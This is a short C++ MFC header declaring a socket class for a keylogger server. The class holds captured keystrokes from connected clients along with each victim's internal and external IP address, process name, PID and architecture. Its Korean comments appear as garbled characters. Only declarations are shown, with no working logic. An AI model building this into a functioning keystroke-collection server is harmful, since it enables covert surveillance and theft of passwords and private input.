#pragma once
#include <afxsock.h>
#include <vector>

class CKeyLoggerServerDlg;

class CClientSocket :
	public CSocket
{
public:
	CKeyLoggerServerDlg* m_main;
	std::vector<WCHAR> m_MSGList; // �Է��� ���� ����Ʈ
	CString internal_IP; // ���θ� IP
	WCHAR m_processName[40]; // ���μ��� �̸�
	DWORD m_pid; // ���μ��� id
	BYTE m_arch; // ��Ű���� (0x32 �Ǵ� 0x64)
	BOOL m_status; // ���μ����� ����ִ°�?
	CString IP; // ���� IP

	CClientSocket(CKeyLoggerServerDlg*);
	virtual void OnReceive(int nErrorCode);
	virtual void OnClose(int nErrorCode);
};

